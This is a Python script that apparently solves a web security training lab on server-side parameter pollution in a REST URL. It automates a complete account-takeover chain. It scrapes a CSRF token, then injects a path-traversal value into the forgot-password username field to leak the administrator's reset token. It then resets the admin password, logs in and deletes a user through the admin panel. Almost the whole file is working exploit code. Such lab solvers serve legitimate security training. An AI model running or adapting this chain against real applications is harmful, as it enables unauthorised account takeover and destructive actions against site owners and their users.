import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting server-side parameter pollution in a REST URL"

NEW_ADMIN_PASSWORD = "mystic_mido"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the forgot password page\n2. Extract the csrf token and session cookie\n3. Make a forgot-password request for administrator\n4. Get the reset token\n5. Reset password for administrator\n6. Login as administrator\n7. Delete carlos from the admin panel\n""")

    print(Fore.WHITE + "[1] Fetching the forgot-password page")
    forgot_password_page = requests.get(
        f"{url}/forgot-password", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting the csrf token and session cookie")
    session = forgot_password_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"",
                            forgot_password_page.text)[0]
    print(Fore.GREEN + "CSRF token" + Fore.WHITE +
          " => " + Fore.YELLOW + csrf_token)

    print(Fore.WHITE +
          "[3] Making a forgot-password request for administrator")
    data = {"username": "administrator", "csrf": csrf_token}
    cookies = {"session": session}
    requests.post(
        f"{url}/forgot-password", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[4] Getting the reset token")
    data = {"username": "../../../../api/internal/v1/users/administrator/field/passwordResetToken#", "csrf": csrf_token}
    cookies = {"session": session}
    fetching_result = requests.post(
        f"{url}/forgot-password", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
    restet_token = re.findall("\"result\": \"(\w*)\"", fetching_result.text)[0]
    print(Fore.GREEN + "reset token" + Fore.WHITE +
          " => " + Fore.YELLOW + restet_token)

    print(Fore.WHITE + "[5] Reseting password for administrator")
    data = {"passwordResetToken": restet_token, "csrf": csrf_token,
            "new-password-1": NEW_ADMIN_PASSWORD, "new-password-2": NEW_ADMIN_PASSWORD}
    cookies = {"session": session}
    requests.post(
        f"{url}/forgot-password", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[6] Logging in as administrator")
    data = {"username": "administrator",
            "password": NEW_ADMIN_PASSWORD, "csrf": csrf_token}
    admin_login = requests.post(
        f"{url}/login", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[7] Deleting carlos from the admin panel")
    admin_session = admin_login.cookies.get("session")
    cookies = {"session": admin_session}

    try:
        r = requests.get(
            f"{url}/admin/delete?username=carlos", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
